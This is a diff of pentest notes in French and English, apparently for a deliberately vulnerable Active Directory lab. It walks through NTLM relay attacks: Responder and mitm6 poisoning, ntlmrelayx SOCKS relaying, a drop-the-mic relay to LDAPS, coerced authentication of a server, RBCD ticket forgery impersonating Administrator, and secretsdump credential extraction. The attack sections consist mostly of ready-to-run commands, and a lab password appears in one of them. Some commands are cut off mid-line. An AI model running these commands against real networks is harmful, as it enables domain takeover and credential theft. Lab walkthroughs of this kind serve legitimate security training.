@@ -44,7 +44,7 @@ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
 sudo responder -I eth1
 ```
 
-### Use a socks relay with an admin account
+Maintenant on va effectuer des actions à travers le proxy socks hébergé par ntlmrelayx qui maintient la connexion ouverte relayée.
 
 #### Dump secrets
 
@@ -61,7 +61,7 @@ proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -
 proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
 ```
 
-## Mitm6 + ntlmrelayx to ldap
+## Mitm6
 
 Empoisonne les requêtes DNSv6 sur le réseau pour rediriger les clients vers un serveur WPAD contrôlé.
 
@@ -92,4 +92,29 @@ If we specify a loot dir all the informations on the ldap are automatically dump
 ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
 ```
 
-## Coerced auth smb + ntlmrelayx to ldaps with drop the mic <a href="#coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic" id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic"></a>
+## Drop the mic <a href="#coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic" id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic"></a>
+
+Start the relay with remove mic to the ldaps of meereen.essos.local.
+
+```bash
+ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --dele
+```
+
+Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
+
+```bash
+python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
+```
+
+The attack worked we can now exploit braavos with RBCD
+
+```bash
+getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/remove
+```
+
+And use that ticket to retreive secrets
+
+```bash
+export KRB5CCNAME=/workspace/Administrator.ccache
+secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
+```
